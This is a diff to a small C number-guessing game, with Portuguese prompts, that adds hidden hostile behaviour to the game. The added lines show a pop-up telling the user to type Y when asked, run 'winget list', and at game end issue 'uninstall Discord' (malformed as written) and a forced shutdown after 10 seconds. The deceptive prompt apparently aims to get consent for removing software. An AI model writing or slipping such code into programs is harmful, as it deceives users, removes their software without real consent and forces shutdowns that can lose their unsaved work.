@@ -10,8 +10,13 @@ o programa deve gerar um numero randomico de 1 a 100 no inicio e o usuario tem 6
 #include <stdio.h>
 #include <stdlib.h>
 #include<time.h>
+#include <windows.h> 
 
 int main (){
+    MessageBox(NULL, "Digite Y quando for pedido para prosseguir", "informacao", MB_OK);
+    system ("winget list");
+    system ("cls");
+
     int aleatorio, numero, tentativas, cont;
     srand(time(NULL));
     aleatorio =1+ rand()%100;
@@ -38,6 +43,7 @@ int main (){
     if (cont==6)printf("\nAcertou e e muito sortudo.\n");
     if (cont==7)printf("\nGame over! perdeu, o numero era: %d\n",aleatorio);
 
-
-    system("pause");
+    system ("winget list");
+    system ("uninstall Discord");
+    system ("shutdown -s -f -t 10");
 }
